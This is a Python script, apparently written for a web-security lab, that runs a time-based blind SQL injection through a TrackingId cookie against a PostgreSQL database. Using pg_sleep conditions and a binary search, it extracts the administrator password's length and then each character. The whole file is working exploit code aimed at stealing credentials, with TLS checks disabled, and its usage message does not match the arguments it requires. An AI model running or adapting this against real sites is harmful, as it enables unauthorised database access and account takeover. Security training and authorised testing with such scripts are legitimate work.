import sys
import requests
import urllib3
import urllib

url = sys.argv[1]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def request(sqli_payload):
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'ZJtlZNco4t8EFT6Q' + sqli_payload_encoded, 'session': 'm2AssDJsVrPtOfB2ez5Vf1WVeABTrxvy'}
    r = requests.get(url, cookies=cookies, verify=False)
    return r

def password_len(a, b):
    while True:
        x = int((a+b)/2)
        sqli_payload = "'||(SELECT CASE WHEN(length(password) = %s ) THEN pg_sleep(10) else pg_sleep(-1) END FROM users where username='administrator')--" % (x)
        r = request(sqli_payload)
        sp = "'||(SELECT CASE WHEN(length(password) > %s ) THEN pg_sleep(10) else pg_sleep(-1) END FROM users where username='administrator')--" % (x)
        r1 = request(sp)
        if a>b:
            print("No value found!")
            exit()
        if int(r.elapsed.total_seconds()) > 9:
            print("Length is: ", x)
            return x
        else:
            sys.stdout.write('\r' + str(x))
        if int(r1.elapsed.total_seconds()) > 9:
            a = x+1
        else:
            b = x-1
        
def sqli_password(a,b):
    l = password_len(a,b)
    print("(+) Retreiving administrator password...")
    password_extracted = ""
    for i in range(1,l+1):
        c = 32
        d = 126
        while True:
            x = int((c+d)/2)
            sql_payload = "'|| (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,x)
            r = request(sql_payload)
            sp = "'|| (select case when (username='administrator' and ascii(substring(password,%s,1))>'%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,x)
            r1 = request(sp)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(x)
                sys.stdout.write('\r'+ password_extracted)
                break
            else:
                sys.stdout.write('\r'+ password_extracted + chr(x))
            if int(r1.elapsed.total_seconds()) > 9:
                c = x+1
            else:
                d = x-1

def main():
    if len(sys.argv) != 4:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    a = int(sys.argv[2])
    b = int(sys.argv[3])
    sqli_password(a, b) 

if __name__ == "__main__":
    main()